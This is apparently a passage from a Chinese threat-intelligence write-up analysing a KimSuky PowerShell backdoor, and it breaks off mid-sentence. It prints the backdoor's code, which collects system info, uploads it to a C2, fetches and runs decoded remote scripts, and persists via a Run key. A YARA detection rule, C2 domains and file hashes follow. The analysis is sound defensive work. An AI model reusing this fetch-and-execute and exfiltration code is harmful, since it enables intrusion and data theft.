    $newStream.Close()
    if($php_post -like "ok")
    echo "UpLoad Success
    echo "UpLoad Fail
    $bReturn = $False
    } while ($sum -le $nEncLen)
    function FileUploading($upPathName)
    $bRet = $True
    $testpath = Test-Path $upPathName
    return $bRet
    $UpL = UpLoadFunc $upPathName
    if($UpL -eq $False)
    $bRet = $False
    echo "Success
    del $upPathName
    function Download
    $downname = $LocalID + ".down"
    $delphppath = $SERVER_ADDR + "del.php"
    $downpsurl = $SERVER_ADDR + $downname
    $codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
    $comletter = decode $codestring
    $decode = $executioncontext.InvokeCommand.NewScriptBlock($comletter)
    $RunningJob = Get-Job -State Running
    if($RunningJob.count -lt 3)
    $JobName = $RunningJob.count + 1
    Start-Job -ScriptBlock $decode -Name $JobName
    $JobName = $RunningJob.count
    Stop-Job -Name $RunningJob.Name
    Remove-Job -Name $RunningJob.Name
    $down_Server_path = $delphppath + "
    filename=$LocalID"
    $response = [System.Net.WebRequest]::Create($down_Server_path).GetResponse()
    $response.Close()
    function Get_info($logpath)
    Get-ChildItem ([Environment]::GetFolderPath("Recent")) >> $logpath
    dir $env:ProgramFiles >> $logpath
    dir "C:\Program Files (x86)" >> $logpath
    systeminfo >> $logpath
    tasklist >> $logpath
    function main
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
    $FilePath = $env:APPDATA + $LOG_FILEPATH
    New-Item -Path $FilePath -Type directory -Force
    $szLogPath = $FilePath + $LOG_FILENAME
    $key = Get-Item -Path $RegKey
    $exists = $key.GetValueNames() -contains $RegValueName
    if($exists -eq $False)
    $value1 = New-ItemProperty -Path $RegKey -Name $RegValueName
    Get_info $szLogPath
    while ($true)
    FileUploading $szLogPath
    Start-Sleep -Milliseconds 10000
    Download
    Start-Sleep -Milliseconds $TIME_VALUE
其中包含了KimSuky常用的协议：$boundary = “——WebKitFormBoundarywhpFxMBe19cSjFnG”
格式化一下这段Powershell代码，可以发现定义了如下几个函数：  
decode 用于解码  
UpLoadFunc 上传数据  
FileUploading 调用UpLoadFunc进行上传  
Download 下载文件到本地执行  
Get_info 获取当前计算机的一些基本信息  
main 主函数
主函数中的调用逻辑如下
    function main
        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
        $FilePath = $env:APPDATA + $LOG_FILEPATH
        New-Item -Path $FilePath -Type directory -Force
        $szLogPath = $FilePath + $LOG_FILENAME
        $key = Get-Item -Path $RegKey
        $exists = $key.GetValueNames() -contains $RegValueName
        if($exists -eq $False)
            $value1 = New-ItemProperty -Path $RegKey -Name $RegValueName
            Get_info $szLogPath
        while ($true)
            FileUploading $szLogPath
            Start-Sleep -Milliseconds 10000
            Download
            Start-Sleep -Milliseconds $TIME_VALUE
在main函数中，程序首先会判断是否存在目标的Run键值，如果不存在则将自身写入到Run键值中，实现本地持久化。
接着程序会通Get_info函数获取计算机的基本信息比如ProgramFiles下的文件信息、Program File
(x86)下的文件信息、Systeminfo信息、Tasklist等等，写入到预定义好的%APPDATA%\Alzip\Alzip.hwp 中
然后通过一个永真循环，一边将本地收集到的信息通过FileUploading上传到指定的C2：  
hxxp[:]//goldbin.myartsonline.com/le/post.php
一边调用Download方法尝试从C2下载后续payload到本地继续执行。
download函数中的delphppath路径为:  
后续payload的下载路径为：  
然后程序通过WebClient的方式建立连接下载yj.down到本地并通过decode函数进行解码。解码之后通过InvokeCommand进行执行。
应该是由于样本在Twitter上被公布，攻击者目前已经关闭了该服务器的服务。  
所以只能从其他地方寻找后续。
顺便补充一个针对此powershell的yara规则
    import "pe"
    rule KimSuky_Ps_Backdoor
    {
        meta:
            description = "powershell backdoor"
            author = "p1ut0"
            date = "2020-10-12"
            reference = "https://twitter.com/cyberwar_15/status/1315160377156460544"
            hash = "772a5abc0e946230a50628db4a08dd80"
        strings:
            $url_string1 = "$downname = $LocalID + \".down\""   fullword ascii
            $url_execPs = "cmd.exe / c powershell.exe -windowstyle hidden IEX"
            $file_op1 = "dir $env:ProgramFiles >> $logpath" fullword ascii
            $file_op2 = "dir \"C:\\Program Files (x86)\" >> $logpath"   fullword ascii
            $file_op3 = "systeminfo >> $logpath"    fullword ascii
            $file_op4 = "tasklist >> $logpath"  fullword ascii
        condition:
            (
                uint16(0) != 0x5A4D
            )
            and
            (
                all of ($url_*) 
            )
            and 
            (
                2 of ($file_*) 
            )
    }
###  断链补充
根据Powershell脚本的一些特点，依托搜索引擎和VT找到了一批日期相近的样本。
其中C2分别为
很遗憾的是目前所有的这些域名对应的下载文件，全部都已经403了。
于是尝试使用里面下载文件的关键字加上KimSuky进行搜索，找到了早些时候ESTSecurity对KimSuky的分析报告，里面提到了mo.down这个文件，是由mo.txt文件通过C2服务器接收然后解码的文件，ESTSecurity指出该文件和ph.down文件解码后分别对应下面的两个exe文件。
两个exe文件的文件名分别为：  
• [남북연합 구상과 추진방안] 워크숍 계획.hwp (다수의 공백 포함) .exe  
• 0730 워크숍2회의 발표문이상신_오창룡.hwp (다수의 공백 포함) .exe
除此之外，根据DNS解析，可以发现这些域名目前都指向在保加利亚的服务器：  
185.176.43.*
同时，可以发现KimSuky至少从19年7月开始就开始使用此Powershell版本作为攻击的前置阶段：
在ESTSecurity对KimSuky的分析报告中还有这样一张图：
其中dongkuiri和pingguo5两个域名刚才已经收集到了。  
值得注意的是foxonline123这个域名，可以看到该域名2019年7月份就出现过一次，在前段时间(2020年7月)又出现了一次
说明foxonlin123这个域名是长久使用的，于是使用该域名作为关键字去VT进行搜索
这里可以看到几个关键点
  1. 除了185.176.43. _这个域，貌似185.176.40._ 这个域也是KimSuky所拥有的
  2. 这里关联了两个exe文件，上传VT时间分别为2020-10-06和2020-08-14
  3. 该域名关联的两个请求的URL，请求格式与上面分析的样本比较类似。
且这里可以看到，对应的两个文件，就是上面ESTSecurity报告中提到的两个文件。这两个exe的md5分别是  
ffff18fc7c2166c2a1a3c3d8bbd95ba1  
dd15c9f2669bce96098b3f7fa791c87d
基本可以确定是此类攻击的后续文件，应该可以补上断链的地方。
###  后续PE对比分析
分别将
ffff18fc7c2166c2a1a3c3d8bbd95ba1  
dd15c9f2669bce96098b3f7fa791c87d